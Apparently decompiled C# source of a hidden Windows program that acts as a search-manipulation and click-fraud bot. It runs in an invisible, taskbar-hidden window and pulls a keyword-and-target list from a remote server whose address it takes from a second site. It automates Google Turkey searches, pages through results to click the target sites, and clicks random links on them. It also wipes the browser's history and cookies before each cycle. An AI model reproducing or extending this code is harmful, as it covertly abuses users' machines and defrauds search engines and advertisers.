using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using ns1;

namespace ns0;

internal class Form1 : Form
{
	private delegate void Delegate0();

	[CompilerGenerated]
	private sealed class Class1
	{
		public Delegate0 delegate0_0;

		public void method_0(object sender, EventArgs e)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			delegate0_0();
			((Timer)sender).Stop();
			((Component)(Timer)sender).Dispose();
		}
	}

	private string string_0 = "http://www.nurullahuzmez.com";

	private string string_1 = "http://[DEGISTIR]/v/v.php";

	private Queue<KeyValuePair<string, string>> queue_0 = new Queue<KeyValuePair<string, string>>();

	private string string_2;

	private string string_3;

	private int int_0 = 1;

	private Dictionary<string, bool> dictionary_0 = new Dictionary<string, bool>();

	private Random random_0 = new Random();

	private IContainer icontainer_0 = null;

	private WebBrowser webBrowser1;

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr intptr_0, int int_1, int int_2);

	[DllImport("user32.dll")]
	public static extern int GetWindowLong(IntPtr intptr_0, int int_1);

	[DllImport("wininet.dll", SetLastError = true)]
	private static extern bool InternetSetOption(IntPtr intptr_0, int int_1, IntPtr intptr_1, int int_2);

	public Form1()
	{
		InitializeComponent();
	}

	private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void method_0()
	{
		method_6();
		try
		{
			int_0 = 1;
			KeyValuePair<string, string> keyValuePair = queue_0.Dequeue();
			string_2 = keyValuePair.Key;
			string_3 = keyValuePair.Value;
			while (webBrowser1.get_IsBusy())
			{
				Thread.SpinWait(10000);
			}
			webBrowser1.Navigate("http://www.google.com.tr/advanced_search?hl=tr");
		}
		catch (InvalidOperationException)
		{
			Environment.Exit(-1);
		}
	}

	private unsafe void method_1()
	{
		void* ptr = stackalloc byte[5];
		WebClient webClient = new WebClient();
		try
		{
			string text = "";
			try
			{
				text = webClient.DownloadString(string_1);
			}
			catch (Exception)
			{
				Environment.Exit(-1);
			}
			string[] array = text.Split(new char[1] { '\n' });
			string[] array2 = array;
			*(int*)ptr = 0;
			while (true)
			{
				((byte*)ptr)[4] = ((*(int*)ptr < array2.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[4] != 0)
				{
					string text2 = array2[*(int*)ptr];
					string[] array3 = text2.Trim().Split(new char[1] { '|' });
					try
					{
						string text3 = array3[1];
						string key = array3[0];
						KeyValuePair<string, string> item = new KeyValuePair<string, string>(key, text3);
						dictionary_0.Add(text3, value: false);
						queue_0.Enqueue(item);
					}
					catch
					{
					}
					(*(int*)ptr)++;
					continue;
				}
				break;
			}
		}
		finally
		{
			((byte*)ptr)[4] = ((webClient == null) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4] == 0)
			{
				((IDisposable)webClient).Dispose();
			}
		}
	}

	private void method_2(string string_4, string string_5)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(string_4).Contains(string_5))
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private unsafe void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		string text = e.get_Url().ToString();
		if (text == "http://www.google.com.tr/advanced_search?hl=tr")
		{
			method_9(delegate
			{
				method_7("name", "hl", "tr");
				method_7("name", "as_q", string_2);
			}, 3000, 6000);
			method_9(delegate
			{
				method_2("value", "Arama");
			}, 4000, 5000);
		}
		else if (text.StartsWith("http://www.google.com.tr/search?hl=tr&as_q=") && !text.Contains("start="))
		{
			method_9(delegate
			{
				void* ptr2 = stackalloc byte[2];
				*(bool*)ptr2 = method_8(string_3);
				((byte*)ptr2)[1] = *(byte*)ptr2;
				if (((byte*)ptr2)[1] == 0)
				{
					method_9(method_3, 5000, 12000);
				}
			}, 3000, 6000);
		}
		else if (text.StartsWith("http://www.google.com.tr") && text.Contains("start="))
		{
			method_9(delegate
			{
				void* ptr = stackalloc byte[2];
				*(bool*)ptr = method_8(string_3);
				((byte*)ptr)[1] = *(byte*)ptr;
				if (((byte*)ptr)[1] == 0)
				{
					method_9(method_3, 5000, 12000);
				}
			}, 3000, 6000);
		}
		else
		{
			if (!text.Contains(string_3) || text.StartsWith("http://www.google.com"))
			{
				return;
			}
			method_9(delegate
			{
				if (!dictionary_0[string_3])
				{
					dictionary_0[string_3] = true;
					method_4();
				}
			}, 20000, 50000);
		}
	}

	private void method_3()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		int_0++;
		HtmlElementCollection links = webBrowser1.get_Document().get_Links();
		foreach (HtmlElement item in links)
		{
			HtmlElement val = item;
			if (val.get_OuterText() == int_0.ToString() || val.get_OuterText() == int_0 + " ")
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private void method_4()
	{
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		List<HtmlElement> list = new List<HtmlElement>(elementsByTagName.get_Count());
		if (elementsByTagName.get_Count() > 0)
		{
			foreach (HtmlElement item in elementsByTagName)
			{
				HtmlElement val = item;
				if (val.GetAttribute("target") != "_blank" && !string.IsNullOrEmpty(val.get_InnerText()) && method_5(val.GetAttribute("href")))
				{
					list.Add(val);
				}
			}
			if (list.Count > 0)
			{
				list[random_0.Next(list.Count - 1)].RaiseEvent("onmouseover");
				list[random_0.Next(list.Count - 1)].RaiseEvent("onmousedown");
				list[random_0.Next(list.Count - 1)].InvokeMember("click");
				list.Clear();
			}
		}
		method_9(delegate
		{
			method_9(method_0, 240001, 241000);
		}, 5000, 6000);
	}

	private bool method_5(string string_4)
	{
		return !string_4.EndsWith("xml") && !string_4.EndsWith("@") && !string_4.EndsWith("SetHomePage") && !string_4.EndsWith("AddFavorite") && !string_4.EndsWith(".jpg") && !string_4.EndsWith(".gif") && !string_4.EndsWith(".png") && !string_4.EndsWith(".rar") && !string_4.EndsWith(".zip") && !string_4.EndsWith(".vcf") && !string_4.EndsWith(".exe") && !string_4.EndsWith(".mp3") && !string_4.EndsWith(".mp4") && !string_4.EndsWith("mailto");
	}

	private void method_6()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "RunDll32.exe";
		processStartInfo.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 1";
		Process process = Process.Start(processStartInfo);
		process.WaitForExit();
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "RunDll32.exe";
		processStartInfo2.Arguments = "InetCpl.cpl,ClearMyTracksByProcess 8";
		Process process2 = Process.Start(processStartInfo2);
		process2.WaitForExit();
		InternetSetOption(IntPtr.Zero, 42, IntPtr.Zero, 0);
	}

	private void method_7(string string_4, string string_5, string string_6)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(string_4).Equals(string_5))
			{
				val.SetAttribute("value", string_6);
			}
		}
	}

	private unsafe bool method_8(string string_4)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		void* ptr = stackalloc byte[2];
		*(sbyte*)ptr = 0;
		List<string> list = new List<string>();
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElementCollection links = webBrowser1.get_Document().get_Links();
			foreach (HtmlElement item in links)
			{
				HtmlElement val = item;
				string attribute = val.GetAttribute("href");
				list.Add(attribute);
				if (!attribute.Contains("//webcache.googleusercontent.com") && !attribute.Contains("&amp;q=related:") && val.GetAttribute("href").Contains(string_4))
				{
					val.RaiseEvent("onmouseover");
					val.RaiseEvent("onmousedown");
					val.InvokeMember("Click");
					*(sbyte*)ptr = 1;
					break;
				}
			}
		}
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	private void method_9(Delegate0 delegate0_0, int int_1, int int_2)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		Timer val = new Timer();
		val.set_Interval(random_0.Next(int_1, int_2));
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate(object sender, EventArgs e)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			delegate0_0();
			((Timer)sender).Stop();
			((Component)(Timer)sender).Dispose();
		});
		val2.Start();
	}

	private void method_10()
	{
		string newValue = "";
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using (WebClient webClient2 = webClient)
		{
			try
			{
				string input = webClient2.DownloadString(string_0);
				Regex regex = new Regex("1(.*?)2", RegexOptions.IgnoreCase | RegexOptions.Compiled);
				Match match = regex.Match(input);
				newValue = match.Groups[1].ToString();
			}
			catch (Exception)
			{
				Environment.Exit(-1);
			}
		}
		string_1 = string_1.Replace("[DEGISTIR]", newValue);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Size(new Size(random_0.Next(1280, 1366), random_0.Next(768, 768)));
		int windowLong = GetWindowLong(((Control)this).get_Handle(), -20);
		SetWindowLong(((Control)this).get_Handle(), -20, windowLong | 0x80);
		method_11();
		method_10();
		method_1();
		Class2.smethod_0();
		method_0();
	}

	private void method_11()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		WebBrowser val = new WebBrowser();
		Version version = val.get_Version();
		if (version.Major < 7)
		{
			Environment.Exit(-1);
		}
		val = null;
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)webBrowser1).set_Dock((DockStyle)5);
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser1).set_Size(new Size(761, 488));
		((Control)webBrowser1).set_TabIndex(0);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		webBrowser1.add_NewWindow((CancelEventHandler)webBrowser1_NewWindow);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(761, 488));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	[CompilerGenerated]
	private void method_12()
	{
		method_7("name", "hl", "tr");
		method_7("name", "as_q", string_2);
	}

	[CompilerGenerated]
	private void method_13()
	{
		method_2("value", "Arama");
	}

	[CompilerGenerated]
	private unsafe void method_14()
	{
		void* ptr = stackalloc byte[2];
		*(bool*)ptr = method_8(string_3);
		((byte*)ptr)[1] = *(byte*)ptr;
		if (((byte*)ptr)[1] == 0)
		{
			method_9(method_3, 5000, 12000);
		}
	}

	[CompilerGenerated]
	private unsafe void method_15()
	{
		void* ptr = stackalloc byte[2];
		*(bool*)ptr = method_8(string_3);
		((byte*)ptr)[1] = *(byte*)ptr;
		if (((byte*)ptr)[1] == 0)
		{
			method_9(method_3, 5000, 12000);
		}
	}

	[CompilerGenerated]
	private void method_16()
	{
		if (!dictionary_0[string_3])
		{
			dictionary_0[string_3] = true;
			method_4();
		}
	}

	[CompilerGenerated]
	private void method_17()
	{
		method_9(method_0, 240001, 241000);
	}
}
